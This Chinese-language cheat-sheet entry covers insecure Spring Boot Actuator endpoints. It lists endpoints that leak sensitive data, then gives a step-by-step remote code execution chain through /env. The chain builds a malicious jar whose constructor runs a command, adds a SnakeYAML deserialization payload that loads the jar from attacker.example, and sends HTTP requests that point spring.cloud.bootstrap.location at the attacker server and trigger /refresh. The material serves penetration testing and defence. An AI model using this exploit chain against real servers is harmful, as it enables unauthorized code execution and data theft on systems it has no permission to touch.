# 不安全的管理接口

## Springboot-Actuator

Actuator 端点允许您监控和与您的应用程序进行交互。
Spring Boot 包括许多内置端点，并允许您添加自己的端点。
例如，`/health` 端点提供基本的应用程序健康信息。

它们中的一些包含敏感信息，例如：

- `/trace` - 显示跟踪信息（默认情况下为最后100个HTTP请求及其头部）。
- `/env` - 显示当前环境属性（来自Spring的ConfigurableEnvironment）。
- `/heapdump` - 构建并返回我们应用程序使用的JVM的堆转储。
- `/dump` - 显示线程转储（包括堆栈跟踪）。
- `/logfile` - 输出日志文件的内容。
- `/mappings` - 显示所有MVC控制器映射。

在Springboot 1.X中，这些端点默认是启用的。
注意：通过HTTP访问敏感端点时将需要用户名/密码。

自Springboot 2.X起，默认仅启用`/health`和`/info`。

### 通过`/env`实现远程代码执行

Spring能够以YAML格式加载外部配置。
YAML配置使用SnakeYAML库解析，该库容易受到反序列化攻击。
换句话说，攻击者可以通过加载恶意配置文件获得远程代码执行。

#### 步骤

1. 生成SnakeYAML反序列化小工具的负载。

- 构建恶意jar文件

```bash
git clone https://github.com/artsploit/yaml-payload.git
cd yaml-payload
# 在执行最后几个命令之前编辑有效负载（见下文）
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

- 编辑src/artsploit/AwesomeScriptEngineFactory.java

```java
public AwesomeScriptEngineFactory() {
    try {
        Runtime.getRuntime().exec("ping rce.poc.attacker.example"); // 在此处插入命令
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

- 创建恶意yaml配置（yaml-payload.yml）

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.example/yaml-payload.jar"]
  ]]
]
```

2. 将恶意文件托管在您的服务器上。

- yaml-payload.jar
- yaml-payload.yml

3. 更改`spring.cloud.bootstrap.location`为您的服务器。

```
POST /env HTTP/1.1
Host: victim.example:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml
```

4. 重新加载配置。

```
POST /refresh HTTP/1.1
Host: victim.example:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

## 参考资料

* [Springboot - 官方文档](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html)
* [利用Spring Boot Actuators - Veracode](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
